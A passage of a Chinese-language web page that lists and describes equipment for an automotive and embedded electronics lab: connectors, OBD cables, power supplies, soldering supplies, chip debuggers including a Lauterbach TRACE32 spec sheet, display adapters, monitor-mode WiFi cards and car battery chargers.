data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/38528ff2c9920e2440493f9e2dfdd87e.png"></p><ol><li><p>DB9接头，数量40套：DB9针串口公头/母头。</p><p>提供40套DB9接头，以确保足够的连接件供应。这些接头包括DB9针串口公头和母头，它们用于创建或维护串行通信接口。这种类型的接头常用于计算机串行端口和各种通信设备之间的连接，其设计保证了设备间稳定的数据传输。有了这些DB9接头，可以轻松地进行设备扩展和维护工作。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/457735e8bf52edc9ea474c35609b2a8e.png"></p><ol><li>OBD线：数量5套。</li></ol><p>提供5套OBD线，这些线缆是汽车诊断工具中不可或缺的部分。OBD线为车辆的“大脑”与诊断设备之间提供了必要的连接，使技术人员能够读取故障代码、监测车辆性能以及执行系统测试。这些线缆的加入，将大大提高对汽车电子系统进行故障诊断和维护的能力。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b013918dc1ce4a4698b4746d19fcf5a1.png"></p><ol><li><p>直流稳压电源，数量10套：三路可编程控直流电源30V/3A*2+5V/3A，艾德克斯IT6302；</p><p>为了满足实验室精确电源供应的需求，提供10套艾德克斯品牌的IT6302型号直流稳压电源。这些电源设备具备三路可编程输出功能，包括两路30V/3A和一路5V/3A，能够为各种电子设备提供稳定和可调节的电源。这种高灵活性和可靠性的电源设备是进行电子电路设计、测试和维护不可或缺的工具，能够极大地提高了工作效率和精确度。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/39819abe263e93d8a5fc46288eb00638.png"></p><ol><li><p>分控插排，数量20套：8个插座孔位，线长3米，品牌公牛。</p><p>提供20套公牛品牌的分控插排。这些插排各自配备了8个插座孔位，线长达到3米，非常适合需要多设备同时供电的场合。公牛作为知名的电器品牌，其产品的质量和安全性能都得到了市场的认可。这些分控插排的加入，将极大地方便了电源分配和设备连接，提升了工作环境的整洁和安全性。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/46ae309182b5821f89c55e2d89437f1a.png"></p><ol><li><p>分控插排，数量20套：8个插座孔位，线长5米，品牌公牛。</p><p>为了增强电源分配的灵活性和便捷性，提供20套品牌为公牛的分控插排。每套插排都拥有8个插座孔位，配备了5米的长电源线，使得远距离的电源连接变得轻松可行。这些高质量的分控插排不仅能够满足多种电器同时使用的需求，而且也极大地提升了工作场所的电源使用效率和安全性。公牛品牌的这一系列产品以其可靠的性能和耐用的设计，赢得了广泛的市场认可。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/315609880812fd646fa4ce57f578cc46.png"></p><ol><li><p>焊锡膏，数量10套：227℃高温无铅锡膏100g/罐。</p><p>为了满足精密电子组装的需求，提供10套高品质的焊锡膏。每套包含100克装的无铅锡膏，能够承受高达227℃的温度，确保在焊接过程中的可靠性和稳定性。这种环保型无铅锡膏的使用，不仅符合现代电子制造业的环保标准，同时也保证了焊接点的质量，对于提高产品的耐用性和可靠性起到了关键作用。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3463f8de39207b263d9c445aaac8aa84.png"></p><ol><li><p>焊锡丝，数量20套：63%焊锡量，线径0.6mm 500克。</p><p>为确保焊接工作的高效性和焊点的精确性，提供20套优质焊锡丝。每套焊锡丝含有63%的焊锡量，线径细至0.6mm，重量为500克，这种精细的焊锡丝使得电子元件的焊接工作更为精准，同时高焊锡量也确保了焊接质量的稳定性与可靠性。此类焊锡丝的使用对于提高电子产品的整体质量和延长使用寿命具有至关重要的作用。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/681490b78c74166e79743b7601810e57.png"></p><ol><li><p>电子环保清洁剂，数量10套：电路板环保清洁剂 550ml装。</p><p>提供10套电子环保清洁剂，以确保电路板维护的环保性和效果。每套清洁剂的容量为550毫升，专为电路板的清洁设计，不仅能够有效去除污渍、油渍和焊锡残留，还能保护电路板不受腐蚀。这种环保型清洁剂的使用有助于提升电子产品的稳定性和延长其使用寿命。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/027cdefcf5256ba56e2a53d6c0f92260.png"></p><ol><li><p>吸锡线，数量20套：宽1.5mm 长1.5米。</p><p>为了提升电子维修和焊接作业的准确性与效率，提供20套高品质吸锡线。每套吸锡线的规格为宽度1.5mm，长度达到1.5米，这样的尺寸使得它在去除多余焊锡时更为灵活和精准。使用这些吸锡线，可以确保电路板焊接处的清洁和平整，有助于提高电子产品的性能和可靠性。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2baba404338ac9f1824725b2bccec53d.png"></p><ol><li><p>烙铁头，数量10套：包含一字头/尖头/扁头。</p><p>为确保焊接工作的精细与多样性，提供10套烙铁头，每套中包含了一字头、尖头和扁头三种类型的烙铁头。这样的组合配备能够满足不同焊接需求，无论是精密的点焊还是面焊，都能够通过相应的烙铁头来实现。这些烙铁头的多功能性大大提升了焊接作业的效率和质量，是焊接工具箱中不可或缺的重要组成部分。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f76ae7a575f6c682390d0a61fc982693.png"></p><ol><li><p>无尘布，数量10套：超细9*9无尘布 100片装。</p><p>为了保障电子产品在生产和维护过程中的清洁度，提供10套高级无尘布。每套包含100片超细9*9尺寸的无尘布，这种无尘布因其超细纤维材质，能够在不留下任何尘埃和纤维残留的情况下，有效清洁电子设备的敏感表面。这些无尘布是实现无尘作业环境的理想选择，对于维护电子产品的清洁度和性能至关重要。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a2f0562d7d737ce2304975c80efe7d2b.png"></p></li><li><p>芯片通用测试钩（烧录夹），数量10个。</p></li></ol><p>为了满足电子产品在开发和维护阶段对芯片进行测试和烧录的需求，提供10个芯片通用测试钩，也称为烧录夹。这些测试钩设计用于便捷地连接和测试各种芯片，无需焊接即可实现对芯片的快速读写操作，大大提高了工作效率。它们是电子工程师在进行芯片调试和程序加载时的重要辅助工具。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/554578387e6b7ba5bcd2c40eccc7c11b.png"></p><ol><li><p>电工绝缘胶带，数量10卷。</p><p>为了确保电工作业的安全性，提供10卷电工绝缘胶带。这种胶带具有优良的绝缘性能，能够有效防止电流泄漏，确保操作人员的安全。在进行电线连接或修补时，这些绝缘胶带是必不可少的，它们不仅提供了一个安全的工作环境，还有助于增强电路的整体稳定性。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0e0fc635f0f9d1818d4d5c927e4484ce.png"></p><ol><li><p>双工头USB，数量20套：公对公 2米 USB3.0。</p><p>提供20套双工头USB连接线，每条线缆长度为2米，且为USB3.0标准，以满足高速数据传输的需求。这些USB线缆特别设计为公对公接口，使其可以轻松连接各种兼容的设备，如电脑之间或与其他USB接口的外设之间。其稳定的传输能力和优质的制造工艺保证了数据传输的可靠性和效率，是办公和家用的理想选择。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/514643e6ac98747bf8acff8a67604df9.png"></p><ol><li>DC母头接线柱，数量20套：5.5*2.1MM/母头。</li></ol><p>提供20套高品质的DC母头接线柱，每套接线柱的规格为5.5*2.1MM，专为确保设备的稳定供电而设计。这些母头接线柱适用于多种电源连接场景，其标准尺寸保证了与相应设备的完美兼容。无论是在实验室、工作坊还是日常的电器维修中，这些DC母头接线柱都会是连接电源的可靠选择，提供安全且连贯的电流输送。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/fe07d29541295988506d3b7ce4fb6c13.png"></p><ol><li><p>DC12V/10A，数量20套：DC12V/10A DC5.5mm接口。</p><p>提供20套DC12V/10A的电源适配器，均配备了标准的DC5.5mm接口，以满足高功率设备的供电需求。这些适配器的输出电压稳定在12V，最大电流可达10A，确保了能够为各种电子设备提供强劲且持续的动力。无论是用于监控设备、LED照明还是其他需要12V电源的应用，这些高效率的适配器都是理想的电源解决方案。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/194e3b5bfaf2ef2e705a99d54b3c82d9.png"></p><ol><li><p>Renesas调试器，数量5套。</p><p>提供5套Renesas调试器，专为开发和调试Renesas微控制器而设计。这些调试器是开发人员的重要工具，它们能够提供精确的性能分析和故障诊断，从而加速开发过程并提高最终产品的稳定性。每套调试器都包含了必要的接口和软件支持，确保与Renesas系列微控制器的无缝对接，为开发团队提供了便捷的调试体验。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ee7cc364d1a7bc1a4ad6838740d98725.png"></p><ul><li><p>支持MCU片上调试仿真；</p><p>调试器支持MCU片上调试仿真，允许开发者在实际的微控制器上直接运行和测试代码，这极大地提高了调试过程的效率和准确性。</p></li><li><p>支持瑞萨芯片烧写；</p><p>为了方便固件的升级和快速部署，调试器提供了对瑞萨芯片烧写的支持，开发者可以轻松地将程序写入目标设备。</p></li><li><p>支持热拔插功能；</p><p>支持热拔插功能的设计确保了开发者可以在不关闭电源的情况下安全地连接或断开调试器，极大地提高了工作的灵活性和便捷性。</p></li><li><p>支持CAN时间测量功能；</p><p>对于需要精确时间同步和性能分析的应用，调试器提供的CAN时间测量功能成为了一个宝贵的工具，它使得开发者可以精确地测量和调整CAN总线上的通信时间，保障系统的同步性和速度。</p></li><li><p>支持电流测量功能。</p><p>电流测量功能让开发者能够监控和优化系统的能耗，这对于设计低功耗设备尤为重要。</p></li></ul><ol><li>多用途调试器，品牌：劳德巴赫，型号：μtrace32，数量1台</li></ol><p>劳特巴赫μtrace32经济高效的全功能调试和追踪模块，充分利用专为需要Arm® Cortex®-M嵌入式设计定制的全功能调试和追踪系统的强大功能。µTrace®是经济高效的一体化解决方案，为实现最多4位紧凑追踪端口的Cortex-M微控制器提供全套功能。</p><p>µTrace®还可用于调试32位RISC-V内核。在RISC-V基金会采用追踪标准后，将立即添加对RISC-V的追踪支持<img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a63918d21fcea0cae5d7793299bb41b5.png"></p><p>劳特巴赫 trace32</p><ol><li><strong>系统组成：</strong>一个系统可根据需求选择基本控制单元模块和信号转换单元模块及适配器组成。</li></ol><p>DEBUG 单元模块（基本控制单元）。DEBUG单元模块扮演着基本控制单元的关键角色，它为开发人员提供了一个强大的工具来监视和控制系统的运行状态。通过这个模块，可以实时地进行代码的调试和问题的诊断，从而确保系统的稳定性和性能得到优化。</p><p>针对不同处理器系列的信号转换单元模块，另有多类型适配器以实现接口转换。包含了一个专门针对不同处理器系列的信号转换单元模块，它的主要功能是确保不同类型的处理器之间能够无缝沟通。为了进一步增强这种兼容性，提供了多类型的适配器，这些适配器能够实现接口转换，从而允许各种不同的设备和处理器之间进行有效的连接和数据交换。这种灵活的设计策略极大地扩展了系统的适用范围，使其能够适应多变的技术需求。</p><p>TRACE 单元模块，它是进行程序跟踪和性能分析的关键组件。这个模块允许开发者捕获和分析程序执行期间的事件和数据流，从而可以详细了解程序的行为和性能瓶颈。通过利用TRACE单元模块，开发者可以优化代码，提高应用程序的效率和速度。</p><p>针对不同处理器系列的跟踪预处理模块，为了提升调试和性能分析的效率，特别设计了针对不同处理器系列的跟踪预处理模块。这个模块的功能是对处理器产生的数据进行即时的收集和预处理，确保了跟踪数据的准确性和可靠性。通过这样的预处理，开发者能够更快地定位问题，优化性能，并对多种处理器系列进行有效的支持和兼容，极大地提高了开发工作的灵活性和系统的适应能力。</p><p>代码逻辑分析模块和逻辑探头模块。的系统配备了先进的代码逻辑分析模块，与之相辅相成的是逻辑探头模块。这两个模块共同工作，为开发者提供了深入分析程序代码逻辑的能力。代码逻辑分析模块可以详细地解读程序的执行流程，而逻辑探头模块则负责在实际的硬件上监测和记录信号，以供分析使用。这一组合不仅帮助开发者理解复杂的代码行为，还可以检测和解决潜在的逻辑错误，从而提高开发效率和程序的稳定性。</p><p>基本控制单元扮演着至关重要的角色，它通过信号转换单元直接连接到目标机电路板上的调试信号接口，从而对目标系统进行全面的调试工作。信号转换单元的设计允许基本控制单元与各种不同的硬件接口兼容，确保了调试过程的顺畅与高效。而TRACE单元模块和跟踪预处理模块则是系统中的可选扩展模块，以实现基于跟踪(trace)信息的丰富调试、分析功能，它们的加入进一步增强了调试系统的功能。这些模块利用跟踪信息来提供更为丰富的调试和分析功能，使得开发人员能够更加精确地监控程序运行时的状态，捕捉细节，并优化程序性能。此外，代码逻辑分析模块是一个可扩展的能耗分析模块，它的独特之处在于能够将目标硬件的能耗与软件代码的执行行直接对应起来。这种功能允许开发人员不仅仅关注代码的功能实现，还能够从能耗的角度进行性能优化。通过这种深入的分析，开发人员可以识别和修改代码中那些能耗不经济的部分，从而在保证功能完整性的同时，提升嵌入式系统的能源效率，实现更加绿色的技术解决方案。这种方法对于电池驱动的便携式设备尤其重要，因为它们对能耗尤为敏感。总的来说，这些模块共同构成了一个强大的系统，为嵌入式开发提供了全面的支持，旨在帮助开发者提升产品质量，加快上市速度，并降低整体开发成本。</p><ol><li><strong>模块化设计：</strong>为了能够有效地保护客户地长期投资，TRACE32® ICD 调试器采用了先进的模块化设计设想。不同的产品搭配或者扩展升级，可以使客户能够支持更多的处理器应用开发。</li></ol><p>TRACE32® ICD调试器的模块化设计理念旨在确保客户的长期投资保值。通过采用这种设计，客户在初期可以根据当前需求选择合适的产品配置，随着技术需求的变化或技术的发展，可以通过搭配不同的模块或进行扩展升级来适应新的处理器应用开发。这种灵活性意味着客户无需为了支持新的处理器或新的开发需求而完全更换调试器，从而节省了成本并增加了设备使用的可持续性。此外，模块化还允许客户针对特定的任务或需求定制其调试器，无论是添加新的接口支持、增强性能还是扩展分析功能，都能通过简单的模块添加或升级来实现，这样的设计充分体现了对客户未来需求的预见性和对投资保护的承诺。</p><ol><li>技术参数：</li></ol><p>·支持 JTAG/ ETM/ PTM 等调试接口。具备广泛的兼容性和灵活性，支持包括JTAG、ETM和PTM在内的多种调试接口。这些接口是嵌入式系统开发中常用的标准，能够为开发者提供强大的硬件调试功能，从而确保开发者能够对各种微控制器和处理器进行深入的程序调试和性能分析。</p><p>·支持 ASM、HLL (C、C++、JAVA) 、脚本语言。在软件开发方面，系统提供了全面的编程语言支持。无论是底层的汇编语言（ASM），还是高级编程语言如C、C++和JAVA，甚至包括各种脚本语言，都能够得到系统的支持。这意味着开发者可以选择最适合需求的编程语言来编写代码，同时利用的系统进行有效的调试。</p><p>·通过 USB2.0, USB3.0 和1Gbit 以太网接口连接到主机。为了确保与主机的高速稳定连接，系统支持通过USB2.0、USB3.0以及1Gbit的以太网接口与主机设备连接。这些接口的多样性保证了与不同硬件配置的主机的兼容性，同时USB3.0和1Gbit以太网接口的高传输速率也大大提高了数据传输效率，使得大量数据的传输变得快速而可靠。</p><p>·上位机（PC 或者 Workstation）操作系统支持 Windows/ Linux/ MacOSX 等。的系统在上位机的操作系统兼容性上做了广泛的优化，无论用户使用的是Windows、Linux还是MacOSX操作系统，都能够顺畅地运行的软件。这种跨平台的支持使得不同操作系统的用户都能够使用的系统，无需担心操作系统的限制，从而在不同的开发环境中都能够保持高效的工作流程。</p><p>·下载速度不小于 4Mbit/s，支持智能下载模式。的调试工具在下载性能上具有显著的优势，下载速度达到4Mbit/s，这意味着在将代码下载到目标设备时，效率极高，可以节省宝贵的开发时间。此外，支持智能下载模式的特性进一步优化了下载过程，只有改变了的部分才会被重新下载，这大大减少了等待时间，提高了开发效率。</p><p>·支持包括 ARMCC, GCC、G++、GNU/GCC、GREENHILLS-C 等与处理器相关的多种编译器。针对不同开发者的需求，的系统支持多种与处理器相关的编译器，包括ARMCC, GCC、G++、GNU/GCC、GREENHILLS-C等。这种广泛的编译器支持确保了开发者可以根据需求选择最合适的工具，同时也保证了代码的优化和性能的最大化。</p><p>·支持包括 Linux,WIN CE, VxWorks, ThreadX 等操作系统调试。当涉及到操作系统级别的调试时，的系统同样展现出了强大的能力。它支持多种操作系统调试，包括Linux, WIN CE, VxWorks, ThreadX等。这使得无论开发者在哪种操作系统上工作，都能够利用的系统进行有效的调试，确保软件的稳定性和性能。</p><p>·支持常用的ARMV8,V7,Cortex.RH850,Tricore2xx,3xx.MPC5xx处理器架构。在处理器架构的支持上，的系统兼容性极强，支持常用的ARMV8, V7, Cortex, RH850, Tricore2xx, 3xx以及MPC5xx等处理器架构。这一宽泛的兼容性使得几乎所有使用这些流行架构的设备都能够使用的系统，为开发者提供了极大的灵活性。</p><p>·支持软件、片上、条件等丰富的断点类型。断点是调试过程中的一个关键功能，的系统支持软件、片上、条件等丰富的断点类型。这样的支持使得开发者可以根据具体的调试需求灵活地设置断点，无论是在软件层面上设置断点，还是在硬件层面，又或者是基于特定条件的断点，都能够轻松实现，极大提升了调试的效率和便捷性。</p><p>·支持 NOR/ NAND 等Flash 烧写。为了适应不同的存储需求，提供了全面的Flash烧写支持，包括市场上主流的NOR和NAND类型Flash。这意味着用户可以根据自己产品的存储技术选择相应的烧写方案，确保了软件能够高效且安全地被加载到目标硬件上。</p><p>·支持指令集仿真功能。在软件开发和调试过程中，指令集仿真功能是不可或缺的。系统支持这一功能，使得开发者能够在不同的硬件环境中模拟指令执行，从而进行更加深入的程序分析和优化，提高代码的兼容性和性能。</p><p>·支持堆栈调用恢复功能。调试过程中，堆栈调用恢复功能极大地简化了错误追踪和程序流程的分析。支持这一功能，允许开发者在出现问题时追溯函数的调用过程，从而快速定位并解决问题。</p><p>·支持内存泄露分析。内存泄露是影响程序稳定性和性能的常见问题，系统能够帮助开发者分析内存泄露问题，从而确保软件的质量和长期稳定运行。</p><p>·支持多核/多CPU 系统调试。对于复杂的现代软件系统，多核或多CPU的支持已经成为标准配置。系统支持多核/多CPU系统调试，这使得开发者能够同步管理和调试多个处理器，为并行计算和高效能软件开发提供了强大的支持。</p><p>·支持 SMP/AMP 架构调试。对于采用对称多处理（SMP）或非对称多处理（AMP）架构的系统，系统同样提供了完善的调试支持。无论是资源共享还是分离的处理器架构，开发者都能利用的工具进行有效的调试，确保系统的最佳性能。</p><p>·MMU/虚拟地址空间。在现代计算环境中，内存管理单元（MMU）和虚拟地址空间是关键技术，用于高效地管理内存资源。系统为MMU和虚拟地址空间提供了支持，使得开发者能够在复杂的内存环境中进行精确的调试和优化。</p><p>·支持 ARM 的Trustzone 模式。系统提供对ARM的TrustZone技术的全面支持，这使得开发者能够在安全敏感的应用中实现硬件级别的安全功能调试。TrustZone模式的支持确保了在处理安全相关代码时能够提供必要的隔离和保护。</p><p>·支持智能脚本。支持智能脚本功能的加入，极大地提升了系统的灵活性和自动化水平。开发者可以编写脚本来自动化复杂的测试过程，从而减少重复性工作，提高测试的效率和准确性。</p><p>·支持历史程序场景重现。支持历史程序场景重现功能，这意味着开发者可以准确地回放程序执行的历史状态，为问题分析和软件调试提供了极大的便利。</p><p>·支持性能分析、代码覆盖率分析。对于性能调优和代码质量保证，提供了性能分析和代码覆盖率分析功能。这些分析工具帮助开发者优化程序性能，确保代码的每一部分都得到了充分的测试。</p><p>·支持程序流、数据流的记录。支持程序流和数据流的记录功能，使得开发者可以详细地追踪程序的执行路径和数据变化，从而更准确地诊断问题和优化性能。</p><p>·支持 Long-term 实时跟踪。支持Long-term实时跟踪功能，允许开发者长时间监控系统的运行状态，这对于发现和分析长期运行中的稀有问题至关重要。</p><p>·跟踪内存大小大于 1Gbyte，跟踪速率大于 500Mhz/s。跟踪内存大小超过1Gbyte，跟踪速率超过500Mhz/s，保证了即使在最高性能要求的情况下，也能够捕捉到足够的数据，以进行深入的分析。</p><p>·支持最高跟踪接口带宽大于 20Gbit/s。支持的最高跟踪接口带宽超过20Gbit/s，这意味着即使是高吞吐量的系统也能够被有效地跟踪和分析。</p><p>·支持高速信号抽样速率 500Mhz/s 的抽样时间。高速信号的抽样速率达到500Mhz/s，使得高频信号也能够被准确地捕捉和分析，对于高速数字电路调试尤为重要。</p><p>·支持大于 64 通道数字/模拟信号的抽样通道。支持大于64通道数字/模拟信号的抽样通道，为复杂的多信号系统提供了强大的数据捕获能力，满足了高级别的测试需求。</p><p>·支持协议分析功能。支持协议分析功能，开发者可以利用这一功能来解析和调试通信协议，确保数据传输的准确性和可靠性。</p><p>·支持能耗分析功能。提供能耗分析功能，这对于移动设备和嵌入式系统的电源管理是一个极其有价值的工具，帮助开发者优化能耗。</p><p>·支持软/硬件综合验证测试。支持软/硬件综合验证测试的功能，确保了在软件与硬件交互的多个层面上都能进行彻底的测试，提高了产品的可靠性和市场竞争力。</p><ol><li><p>infineon芯片调试器，数量5套：支持infineon芯片烧写。</p><p>提供了5套专业的infineon芯片调试器，这些调试器专门设计用于对infineon系列芯片进行高效的烧写操作。无论是在产品开发阶段还是在后期的维护工作中，这些调试器都能确保对infineon芯片进行快速、可靠的程序加载和固件更新。具备这些调试器，开发团队可以大幅提升工作效率，缩短产品上市时间，同时保证了软件在硬件上的最佳性能表现。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0bfe4e6f19a84caa0110238089ca6b74.png"></p><ol><li><p>JLINK调试器转接板，数量10套。</p><p>提供10套JLINK调试器转接板，这些转接板是为了提高与JLINK调试器的兼容性而精心设计的。它们允许开发者将JLINK调试器连接到多种不同的目标板和芯片上，极大地扩展了JLINK调试器的适用范围。这些转接板的存在，使得开发者可以在不同的硬件环境中使用同一套调试器，提升了工具的灵活性。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/59444553a1b1455c55d6bb03cbeb2cc7.png"></p><ol><li><p>零部件整理箱20个，尺寸80L。</p><p>提供20个容量为80升的零部件整理箱，这些整理箱对于管理和存储各种电子零部件至关重要。它们的大容量设计使得可以容纳大量的零件，而且结构坚固，保证了零部件的安全与整洁。使用这些整理箱可以有效避免零件的混乱与丢失，极大地提高了组装和维修过程中的效率。此外，透明的设计便于快速查找所需零件，进一步提升工作效率。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/269a4f4e2a8d02b6c86937abfa530cf7.png"></p><ol><li><p>HDMI转DP转接头，数量40个。</p><p>提供40个HDMI转DP（DisplayPort）转接头，这些转接头是为了满足不同显示设备之间的连接需求而设计的。它们可以将标准的HDMI信号转换为DP信号，从而使得支持HDMI输出的设备能够与DP输入的显示器或其他视觉设备兼容。这种转接头的使用极大地提升了设备间的互操作性，确保了各种设备之间的视频信号传输无缝对接，无论是在会议展示还是在多屏工作站，都能保证清晰稳定的视觉输出。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/b404cfc649e7532bfce17cc946dcf9e6.png"></p><ol><li><p>网线，数量20个，长度1米。</p><p>提供20根长度为1米的网线，这些网线对于建立可靠的网络连接至关重要。它们的标准长度确保了足够的灵活性，同时避免了过长导致的线材缠绕和空间浪费。这些网线适用于连接各种网络设备，如路由器、交换机、电脑等，能够支持高速互联网连接，保证数据传输的效率和稳定性。使用这些高品质的网线，可以有效地组建或维护家庭、办公室的网络环境，确保网络通信的畅通无阻。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8e51f6454c04e4129dd95da0c0e6cb29.png"></p><ol><li><p>HDMI转VGA转接头,数量5个。</p><p>提供5个HDMI转VGA转接头，这些转接头扮演着将现代设备的HDMI视频输出转换为VGA接口输入的重要角色。它们使得带有HDMI接口的设备，如最新的笔记本电脑、游戏机或者其他多媒体设备，能够与只支持VGA输入的旧式显示器或投影仪连接。这种转换能力极大地增强了设备之间的兼容性，尤其是在需要将高清内容传输到没有HDMI接口的老旧显示设备上时。通过这5个转接头，用户可以轻松地进行视频输出设备的扩展和升级，而无需更换现有的显示设备。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/30d2f2ccbb9ed50a0d5d969e4b103f32.png"></p><ol><li><p>HDMI转Type-C转接头，数量5个。</p><p>提供5个HDMI转Type-C转接头，它是非常实用的小配件，它们允许用户将带有HDMI端口的设备，如电视、显示器或投影仪，与拥有Type-C端口的设备，进行高质量的视频信号连接。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a23d721ebdb2e0ac897467a0583e70d6.png"></p><ol><li><p>HDMI转lightning转接头，数量5个。</p><p>提供5个HDMI转lightning转接头。这5个转接头的提供，确保了不同环境下多台设备的连接需求得以满足，提高了多媒体展示的灵活性和便捷性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/eab933048f2f3884b26baa39250eaa7b.png"></p></li><li><p>HDMI线，数量20个，长度3米。</p><p>提供20根长度为3米的HDMI线。这些线缆是现代数字设备连接不可或缺的组成部分。它们能够连接各种设备，支持高清视频和多声道音频的传输。3米的长度使得这些HDMI线非常适合会议室，它们提供了足够的灵活性，可以轻松布线而不会受到空间限制。这些线缆的数量和长度，确保了可以在多个大型办公空间内进行高效的布局和连接。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9ea3207ea03e28ba545c2c9a5b75ad3d.png"></p><ol><li><p>无线网卡，数量5个，支持监听模式，可抓取空中WiFi数据包。</p><p>提供5个无线网卡，这些网卡具备支持监听模式的功能，能够抓取空中的WiFi数据包。这种能力对于网络安全分析师和系统管理员来说极其重要，因为它允许他们监控网络流量，识别潜在的安全威胁，以及进行网络诊断和故障排除。这些无线网卡的加入，提供了一种有效工具，以便在需要进行网络监控或数据分析的情况下，捕获无线环境中传输的数据。对于网络安全实践、教育演示或者WiFi网络的优化工作，这些无线网卡都是不可或缺的工具。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/e41779b7b3122065163bf2579c801fc3.png"></p><ol><li><p>汽车电瓶充电器，数量1套，支持电流调节，支持不同电瓶充电，支持LCD数显可视化操作，支持智能芯片，提供充电夹。</p><p>提供1套汽车电瓶充电器，它具备多项实用功能，以满足现代汽车维护的需求。首先，该充电器支持电流调节功能，允许用户根据不同的汽车电瓶需求，调整充电电流的大小，这样既可以保证电瓶的充电效率，又可以延长电瓶的使用寿命。其次，它支持不同电瓶充电，无论是小型汽车还是大型车辆的电瓶，这套充电器都能兼容，增加了使用的灵活性。此外，它配备了LCD数显屏幕，使得操作过程可视化，用户可以直观地看到充电状态和相关参数，简化了操作过程。支持智能芯片的设计意味着该充电器可以自动适应电瓶的状态和充电需求，提供更加智能和安全的充电方案。最后，充电器还提供了充电夹，这使得连接电瓶变得快捷方便，无需使用其他工具即可开始充电过程。这些特点共同使得这套汽车电瓶充电器是车主和汽车维修工的理想选择。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/36b1933e532c69974d20338a6dd57c18.png"></p></li><li><p>车载应急启动电源，数量1套，支持容量16500毫安，支持电流600A，支持LED数显屏，提供电瓶线夹，支持双USB输出。</p><p>提供1套车载应急启动电源，设计用于应对汽车电瓶意外放电或失效的紧急情况。该启动电源拥有高达16500毫安的电池容量，能够提供强大的启动能力，同时支持高达600A的启动电流，确保即使在极端低温环境下也能轻松启动大多数汽车。配备的LED数显屏使得用户可以直观地监控电源的电量和工作状态，操作更加直观便捷。为了方便连接汽车电瓶，该套装还提供了专用的电瓶线夹，这些线夹设计精良，确保连接稳定且安全。此外，它还支持双USB输出，这意味着在为汽车提供急救启动的同时，还可以为手机、平板电脑等设备充电，极大地增强了该产品的实用性和便携性。这套车载应急启动电源是每位车主都应该配备的必备工具，它不仅能在紧急情况下发挥关键作用，还能在日常生活中提供额外的便利。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 